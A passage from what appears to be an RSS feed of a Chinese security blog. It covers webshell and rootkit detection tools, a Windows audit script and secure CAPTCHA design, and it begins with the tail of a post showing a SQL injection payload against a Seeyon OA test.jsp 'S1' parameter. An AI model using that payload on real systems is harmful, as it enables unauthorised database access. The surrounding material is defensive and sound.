&lt;p&gt;注入点为S1变量，通过探测，发现是mysql数据库&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;amp;S1=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是构造注入语句查询数据库名：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;amp;S1=(SELECT%20database())&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="http://www.pa55w0rd.club/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux后门入侵检测工具使用</title>
    <link href="http://www.pa55w0rd.club/linux-backdoor-killer/"/>
    <id>http://www.pa55w0rd.club/linux-backdoor-killer/</id>
    <published>2018-12-03T07:07:05.000Z</published>
    <updated>2018-12-04T08:58:50.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。</p><h2 id="0x01-Webshell查杀"><a href="#0x01-Webshell查杀" class="headerlink" title="0x01 Webshell查杀"></a>0x01 Webshell查杀</h2><h3 id="1-1-D盾-Web查杀"><a href="#1-1-D盾-Web查杀" class="headerlink" title="1.1 D盾_Web查杀"></a>1.1 D盾_Web查杀</h3><p>D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为</p><p>引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况</p><blockquote><p>PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库<br><a id="more"></a></p></blockquote><h4 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">D盾_WEB查杀V2.0.9 下载链接</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># D盾只有win版的，需要把源代码打包下来进行扫描，或使用nfs共享目录挂载到windows系统</span></span><br><span class="line"><span class="meta"># 这里使用tar把源码打包下来进行扫描</span></span><br><span class="line">tar -cvf webshell.tar webshell/</span><br></pre></td></tr></table></figure><img src="/linux-backdoor-killer/D盾.png" title="D盾webshell查杀"><h3 id="1-2-深信服WebShellkiller"><a href="#1-2-深信服WebShellkiller" class="headerlink" title="1.2 深信服WebShellkiller"></a>1.2 深信服WebShellkiller</h3><p>WebShellkiller作为一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。这是一款融合了多重检测引擎的查杀工具。在传统正则匹配的基础上，采用模拟执行，参数动态分析监测技术、webshell语义分析技术、暗链隐藏特征分析技术，并根据webshell的行为模式构建了基于机器学习的智能检测模型。传统技术与人工智能技术相结合、静态扫描和动态分析相结合，更精准地检测出WEB网站已知和未知的后门文件。</p><h4 id="安装使用-1"><a href="#安装使用-1" class="headerlink" title="安装使用"></a>安装使用</h4><p><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">Windows</a><br><a href="http://edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz" target="_blank" rel="noopener">Linux</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Windows平台同D盾</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># linux平台</span></span><br><span class="line"><span class="meta"># 下载WebShellkiller</span></span><br><span class="line">wget http:<span class="comment">//edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 解压到当前目录</span></span><br><span class="line">tar -zxvf WebShellKillerForLinux.tar.gz </span><br><span class="line"><span class="meta"># 查看解压结果，可以看到多出centos_32、centos_64、linux_64三个文件夹</span></span><br><span class="line"><span class="meta"># 查看当前系统版本</span></span><br><span class="line">cat /etc/system-release &amp;&amp; uname -m</span><br><span class="line"></span><br><span class="line"><span class="meta"># 进入centos_64</span></span><br><span class="line">cd centos_64/wscan_app/</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan 默认没有可执行权限</span></span><br><span class="line">chmod u+x wscan</span><br><span class="line"></span><br><span class="line"><span class="meta"># wscan从LD_LIBRARY_PATH加载so文件，需要将当前路径加到LD_LIBRARY_PATH以使wscan能找到当前目录下的so</span></span><br><span class="line">export LD_LIBRARY_PATH=`pwd`:$LD_LIBRARY_PATH</span><br><span class="line"></span><br><span class="line"><span class="meta"># 执行扫描</span></span><br><span class="line">./wscan -hrf ../../webshell/jsp</span><br></pre></td></tr></table></figure></p><h3 id="1-3-CloudWalker（牧云）"><a href="#1-3-CloudWalker（牧云）" class="headerlink" title="1.3 CloudWalker（牧云）"></a>1.3 CloudWalker（牧云）</h3><p>CloudWalker（牧云）是长亭推出的一款开源服务器安全管理平台。根据项目计划会逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等各项功能。</p><p>本次开源作为开源计划的第一步，仅包含 Webshell 检测引擎部分，重点调优 Webshell 检测效果。目前放出的是一个可执行的命令行版本 Webshell 检测工具。</p><h4 id="安装使用-2"><a href="#安装使用-2" class="headerlink" title="安装使用"></a>安装使用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 工具打包形式为单个可执行文件，下载之后添加可执行权限即可执行。</span></span><br><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/chaitin/</span>cloudwalker<span class="regexp">/releases/</span>download<span class="regexp">/webshell-detector-1.0.0/</span>webshell-detector-<span class="number">1.0</span>.<span class="number">0</span>-linux-amd64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">.<span class="regexp">/webshell-detector -html -output result.html /</span>var<span class="regexp">/www/</span>webshell<span class="regexp">/</span></span><br></pre></td></tr></table></figure><h2 id="木马后门类查杀"><a href="#木马后门类查杀" class="headerlink" title="木马后门类查杀"></a>木马后门类查杀</h2><p>可以设置定时任务定期查杀</p><h3 id="2-1-ClamAV"><a href="#2-1-ClamAV" class="headerlink" title="2.1 ClamAV"></a>2.1 ClamAV</h3><p>ClamAV是一个在命令行下查毒软件，是免费开源产品，支持多种平台，如：Linux/Unix、MAC OS X、Windows、OpenVMS。ClamAV是基于病毒扫描的命令行工具，但同时也有支持图形界面的ClamTK工具。为什么说是查毒软件呢，因为它不将杀毒作为主要功能，默认只能查出您服务器内的病毒，但是无法清除，至多删除文件。不过这样，已经对我们有很大帮助了。</p><h4 id="安装使用-3"><a href="#安装使用-3" class="headerlink" title="安装使用"></a>安装使用</h4><p>clamav的官方网站是<a href="http://www.clamav.net，" target="_blank" rel="noopener">http://www.clamav.net，</a> 可以从<a href="http://www.clamav.net/downloads" target="_blank" rel="noopener">http://www.clamav.net/downloads</a> 下载最新版本，也可以通过yum在线安装clamav，因为clamav包含在epel源中，所以方便起见，通过yum安装最简单。也可以编译安装<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Yum安装clamav</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum -y <span class="keyword">install</span> clamav clamav-milter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行扫描</span></span><br><span class="line">clamscan -r -l scan.log /<span class="keyword">var</span>/www/webshell</span><br><span class="line">-r 表示递归扫描子目录</span><br><span class="line">-l 增加扫描报告</span><br><span class="line"><span class="keyword">move</span> [路径] 表示移动病毒文件到指定的路径</span><br><span class="line">remove [路径] 表示扫描到病毒文件后自动删除病毒文件</span><br></pre></td></tr></table></figure></p><h3 id="2-2-rookit"><a href="#2-2-rookit" class="headerlink" title="2.2 rookit"></a>2.2 rookit</h3><p>rootkit是Linux平台下最常见的一种木 马后门工具，它主要通过替换系统文件来达到攻 击和和隐蔽的目的，这种木 马比普通木 马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木 马。rootkit攻 击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻 击者保住权限，以使它在任何时候都可以使用root权限登录到系统。</p><p>一般杀毒软件运行于ring3级别只能查杀ring3级别的木马，rookit是运行于ring0级别的木马，所以查杀rootkit也需要ring0级杀毒程序。Rootkit Hunter正是一款专门查杀rootkit的软件。</p><h4 id="2-2-1-RKHunter"><a href="#2-2-1-RKHunter" class="headerlink" title="2.2.1 RKHunter"></a>2.2.1 RKHunter</h4><p>Rkhunter的中文名叫“Rootkit猎手”, 目前可以发现大多数已知的rootkits和一些嗅探器以及后门程序。它通过执行一系列的测试脚本来确认服务器是否已经感染rootkits，比如检查rootkits使用的基本文件，可执行二进制文件的错误文件权限，检测内核模块等等。在官方的资料中，RKHunter可以作的事情有：</p><ol><li>MD5校验测试，​检测文件是否有改动</li><li>检测rootkit使用的二进制和系统工具文件</li><li>检测特洛伊木 马程序的特征码</li><li>检测常用程序的文件属性是否异常</li><li>检测系统相关的测试</li><li>检测隐藏文件</li><li>检测可疑的核心模块LKM</li><li>检测系统已启动的监听端口</li></ol><h5 id="安装使用-4"><a href="#安装使用-4" class="headerlink" title="安装使用"></a>安装使用</h5><p><a href="http://rootkit.nl/projects/rootkit_hunter.html" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum安装rkhunter</span></span><br><span class="line">yum <span class="keyword">install</span> epel-<span class="keyword">release</span></span><br><span class="line">yum <span class="keyword">install</span> rkhunter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的几个参数选项有：</span></span><br><span class="line">c, <span class="comment">--check 必选参数，表示检测当前系统</span></span><br><span class="line">configfile &lt;<span class="keyword">file</span>&gt; 使用特定的配置文件</span><br><span class="line">cronjob   作为cron任务定期运行</span><br><span class="line">sk, <span class="comment">--skip-keypress   自动完成所有检测，跳过键盘输入</span></span><br><span class="line">summary   显示检测结果的统计信息</span><br><span class="line"><span class="keyword">update</span>    检测更新内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用--skip-keypress参数跳过回车</span></span><br><span class="line">rkhunter -c <span class="comment">--skip-keypress</span></span><br></pre></td></tr></table></figure></p><p>检查主要分成6个部分</p><ol><li>进行系统命令的检查，主要是检测系统的二进制文件，因为这些文件最容易被rootkit。显示OK字样表示正常，显示Warning表示有异常，需要引起注意，而显示“Not found”字样，一般无需理会。</li><li>主要检测常见的rootkit程序，显示绿色的“Not found”表示系统未感染此rootkit。</li><li>主要是一些特殊或附加的检测，例如对rootkit文件或目录检测、对恶意软件检测以及对指定的内核模块检测。</li><li>主要对网络、系统端口、系统启动文件、系统用户和组配置、SSH配置、文件系统等进行检测。</li><li>主要是对应用程序版本进行检测。</li><li>其实是上面输出的一个总结，通过这个总结，可以大概了解服务器目录的安全状态。</li></ol><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/rkhunter -c --skip-keypress 2&gt;&amp;1 | mail -s &quot;rkhunter Reports of My Server&quot; you@yourdomain.com</code></p><h4 id="2-2-2-chkrootkit"><a href="#2-2-2-chkrootkit" class="headerlink" title="2.2.2 chkrootkit"></a>2.2.2 chkrootkit</h4><p>Chkrootkit是一个在本地系统检查rootkit痕迹的工具，它是检查系统二进制文件是否被rootkit病毒修改的一个shell脚本。</p><h5 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h5><p><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 安装编译工具包</span></span><br><span class="line">yum install gcc gcc-c++ make</span><br><span class="line">yum install glibc-<span class="keyword">static</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 安装chkrootkit </span></span><br><span class="line">wget ftp:<span class="comment">//ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span></span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit</span><br><span class="line">make sense</span><br><span class="line"><span class="meta"># 常用参数</span></span><br><span class="line">-h 显示帮助信息</span><br><span class="line">-V 显示版本信息</span><br><span class="line">-l 显示测试内容</span><br><span class="line">-d debug模式，显示检测过程的相关指令程序</span><br><span class="line">-q 安静模式，只显示有问题部分，</span><br><span class="line">-x 高级模式，显示所有检测结果</span><br><span class="line">-r dir 设定指定的目录为根目录</span><br><span class="line">-p dir1:dir2:dirN 检测指定目录</span><br><span class="line">-n 跳过NFS连接的目录</span><br><span class="line"></span><br><span class="line"><span class="meta"># 使用，出现INFECTED就说明系统可能有问题了</span></span><br><span class="line">./chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure></p><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/chkrootkit 2&gt;&amp;1 | mail -s &quot;chkrootkit Reports of My Server&quot; you@yourdomain.com</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。&lt;/p&gt;
&lt;h2 id=&quot;0x01-Webshell查杀&quot;&gt;&lt;a href=&quot;#0x01-Webshell查杀&quot; class=&quot;headerlink&quot; title=&quot;0x01 Webshell查杀&quot;&gt;&lt;/a&gt;0x01 Webshell查杀&lt;/h2&gt;&lt;h3 id=&quot;1-1-D盾-Web查杀&quot;&gt;&lt;a href=&quot;#1-1-D盾-Web查杀&quot; class=&quot;headerlink&quot; title=&quot;1.1 D盾_Web查杀&quot;&gt;&lt;/a&gt;1.1 D盾_Web查杀&lt;/h3&gt;&lt;p&gt;D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为&lt;/p&gt;
&lt;p&gt;引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库&lt;br&gt;
    
    </summary>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>WINSpect-基于Powershell的Windows安全审计工具</title>
    <link href="http://www.pa55w0rd.club/winspect/"/>
    <id>http://www.pa55w0rd.club/winspect/</id>
    <published>2018-12-03T03:59:36.000Z</published>
    <updated>2018-12-03T06:11:40.596Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">项目地址</a></p></blockquote><h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。</p><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>WINSpect将为我们提供审计检查和枚举：</p><ul><li>检查已安装的安全产品</li><li>检查DLL劫持</li><li>检查用户账户控制设置<a id="more"></a></li><li>本地文件系统共享</li><li>具有本地组成员身份的域用户和组</li><li>注册表autoruns</li><li>可由Authenticated Users组成员配置的本地服务</li><li>Authenticated Users组成员可以写入相应二进制文件的本地服务</li><li>非system32 Windows托管服务及其相关的DLL</li><li>非引用服务路径漏洞</li><li>非系统计划任务DLL劫持</li><li>自动安装</li></ul><h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:A-mIn3/WINspect.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用管理员权限打开powershell，并运行WINSpect脚本</span></span><br><span class="line">.\WINspect.ps1</span><br></pre></td></tr></table></figure><h2 id="0x03-排错"><a href="#0x03-排错" class="headerlink" title="0x03 排错"></a>0x03 排错</h2><p>Win10系统使用过程中报错<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.\WINspect.ps1 : 无法加载文件 E:\WINspect\WINspect.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 http</span><br><span class="line">s:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span> 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:<span class="number">1</span> 字符: <span class="number">1</span></span><br><span class="line">+ .\WINspect.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure></p><p>是因为Windows PowerShell 执行策略限制你确定 Windows PowerShell 加载配置文件并运行脚本的条件。</p><p>通过<code>Get-ExecutionPolicy</code>命令获取挡前执行策略，默认执行策略为<code>Restricted</code></p><ul><li>允许单独的命令，但不会运行脚本。</li><li>阻止所有脚本文件的运行，包括格式设置文件和配置文件 (.ps1xml)、模块脚本文件 (.psm1) 和 Windows PowerShell 配置文件 (.ps1)。</li></ul><p>更改执行策略<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> -ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span></span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br></pre></td></tr></table></figure></p><p>详细内容参考<a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/powershell-scripting/hh847748(v=wps.640" target="_blank" rel="noopener">about_Execution_Policies</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/A-mIn3/WINspect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。&lt;/p&gt;
&lt;h2 id=&quot;0x01-功能&quot;&gt;&lt;a href=&quot;#0x01-功能&quot; class=&quot;headerlink&quot; title=&quot;0x01 功能&quot;&gt;&lt;/a&gt;0x01 功能&lt;/h2&gt;&lt;p&gt;WINSpect将为我们提供审计检查和枚举：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查已安装的安全产品&lt;/li&gt;
&lt;li&gt;检查DLL劫持&lt;/li&gt;
&lt;li&gt;检查用户账户控制设置
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="windows 审计工具" scheme="http://www.pa55w0rd.club/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>如何设计相对安全的图形验证码？ （转发）</title>
    <link href="http://www.pa55w0rd.club/captcha/"/>
    <id>http://www.pa55w0rd.club/captcha/</id>
    <published>2018-11-27T10:02:10.000Z</published>
    <updated>2018-11-27T10:46:09.333Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自 <a href="https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA</a></p></blockquote><h2 id="0x00-验证码是什么"><a href="#0x00-验证码是什么" class="headerlink" title="0x00 验证码是什么"></a>0x00 验证码是什么</h2><p>验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><h2 id="0x01-有什么作用"><a href="#0x01-有什么作用" class="headerlink" title="0x01 有什么作用"></a>0x01 有什么作用</h2><p>简单概括如下：</p><p>验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　<br><a id="more"></a><br>好了，废话不多说，为了回答我们最初的问题，我们必须要知道图形验证码在设计和使用中有哪些坑，哪些地方容易出问题。</p><h2 id="0x02-设计或使用方法不当"><a href="#0x02-设计或使用方法不当" class="headerlink" title="0x02 设计或使用方法不当"></a>0x02 设计或使用方法不当</h2><ol><li>图形验证码数值在返回包中返回前端(可通过自动化程序输入验证码，导致验证码无效，导致防护失效)</li><li>图形验证码的值由前端生成，发送到后端形成图片</li><li>图形验证码验证后不失效（成功或失败都应该失效）,可以无限复用</li><li>单独验证图形验证码，正确返回1，错误返回0，而认证请求却不包含图形验证码（可以绕过前端验证）</li><li>万能图形验证码（测试环境为方便设置的万能验证码，上线后未关闭）</li><li>验证码参数值为空时不检测图形验证码</li><li>无验证码参数时(参数名和参数值都不存在)不检测图形验证码(一般是之前设计的时候没加图形验证码，后期添加图形验证码时保留了老接口)</li><li>验证码大小值由前端控制,后端无大小检测(生成超大图形验证码，造成内存耗尽，拒绝服务)</li><li>图形验证码过于简单(无扭曲，无干扰线导致，可自动化图像识别)</li><li>认证过程中，先验证账号密码，后验证图形验证码(逻辑顺序有误，验证码起不到防护作用)</li><li>验证码图片中数值不够随机，可预测导致可以猜解。</li></ol><h2 id="0x03-如何设计出一个相对安全的图形验证码"><a href="#0x03-如何设计出一个相对安全的图形验证码" class="headerlink" title="0x03 如何设计出一个相对安全的图形验证码"></a>0x03 如何设计出一个相对安全的图形验证码</h2><p><strong>设计上：</strong></p><ol><li>验证码字符集合和长度应可配置，至少四位，不允许单独使用英文字符或数字。</li><li>验证码要能够置设置背景色、字符颜色、字符旋转、扭曲、字符粘连等，要添加干扰线，干扰线的颜色、尺寸和数量要可通过配置进行设定。</li><li>验证码生成过程中不仅要使用安全随机函数还要确保种子绝对随机的，保证每次生成验证码的唯一性和不可预测性，防止重放攻击。</li><li>针对一次请求生成的验证码只能用一次，用完立即过期。每次生成的验证码不允许跨会话和请求使用。</li><li>验证码内容不允许以任何形式输出到客户端包括验证码的MD5值、 Base64转码值等。</li></ol><p><strong>另外图形验证码使用上应注意：</strong></p><ol><li>验证码参数和认证参数需要一起提交，到后端验证时要先验证验证码，正确后再进行后续认证。</li><li>后台系统中验证码的验证逻辑要先于口令的验证，只有通过验证码的验证后才能进行用户名、口令等其他身份信息的验证过程。</li><li>线上系统不应存在万能验证码，或不验证验证码内容的情况</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自 &lt;a href=&quot;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-验证码是什么&quot;&gt;&lt;a href=&quot;#0x00-验证码是什么&quot; class=&quot;headerlink&quot; title=&quot;0x00 验证码是什么&quot;&gt;&lt;/a&gt;0x00 验证码是什么&lt;/h2&gt;&lt;p&gt;验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。&lt;/p&gt;
&lt;h2 id=&quot;0x01-有什么作用&quot;&gt;&lt;a href=&quot;#0x01-有什么作用&quot; class=&quot;headerlink&quot; title=&quot;0x01 有什么作用&quot;&gt;&lt;/a&gt;0x01 有什么作用&lt;/h2&gt;&lt;p&gt;简单概括如下：&lt;/p&gt;
&lt;p&gt;验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="验证码安全" scheme="http://www.pa55w0rd.club/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全设计" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap笔记</title>
    <link href="http://www.pa55w0rd.club/sqlmap/"/>
    <id>http://www.pa55w0rd.club/sqlmap/</id>
    <published>2018-11-27T09:04:23.000Z</published>
    <updated>2018-12-04T08:51:02.988Z</updated>
    
